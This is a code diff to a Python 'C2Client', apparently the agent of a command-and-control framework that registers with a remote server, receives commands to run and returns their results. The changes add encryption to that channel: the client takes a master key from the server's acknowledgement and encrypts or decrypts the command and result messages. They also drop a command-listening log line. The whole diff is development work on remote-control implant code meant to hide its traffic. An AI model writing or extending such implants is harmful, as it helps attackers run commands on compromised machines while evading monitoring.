@@ -12,13 +12,15 @@ import asyncio
 import logging
 import time
 import uuid
+import base64
 import argparse
 import subprocess
 from typing import List
-from message import Message
+from models.message import Message
 from models.send_receive_msgs import send_message, receive_message
 from models.message_type import MessageType
 from models.command_type import CommandType
+from models.encryption_manager import EncryptionManager
 
 # ==================== CONFIGURATION ====================
 
@@ -37,6 +39,7 @@ class C2Client:
         self.server_host = server_host
         self.server_port = server_port
         self.client_id = client_id
+        self._encryption_manager = None
         self.reader = None
         self.writer = None
         self.running = True
@@ -60,12 +63,15 @@ class C2Client:
             # Send registration message
             await send_message(
                 self.writer,
-                Message.as_register(self.client_id)
+                Message.as_register(self.client_id).to_payload(True)
             )
             
             # Receive acknowledgment
             msg = await receive_message(self.reader)
+            msg = Message.from_payload(msg)
             if msg and msg.type is MessageType.ACK:
+                master_key = base64.b64decode(msg.command)
+                self._encryption_manager = EncryptionManager(master_key)
                 logger.info(f"Registered as {msg.client_id}")
                 is_connected = True
             else:
@@ -168,7 +174,6 @@ class C2Client:
         """
         try:
             while self.running:
-                logger.info("Listening for command")
                 msg = await receive_message(self.reader)
 
                 # Connection closed
@@ -179,6 +184,7 @@ class C2Client:
                         logger.info("Server closed connection")
                     self.shutdown_event.set()
                     break
+                msg = self._encryption_manager.decrypt(msg)
                 
                 if msg.type is MessageType.COMMAND:
                     # Queue command for execution
@@ -232,9 +238,11 @@ class C2Client:
                 exec_time_ms = (time.time() - start_time) * 1000
                 
                 # Send result back to server
+                msg = Message.as_result(cmd_id, result, exec_time_ms)
+                msg = self._encryption_manager.encrypt(msg)
                 success = await send_message(
                     self.writer,
-                    Message.as_result(cmd_id, result, exec_time_ms)
+                    msg
                 )
                 if success:
                     logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
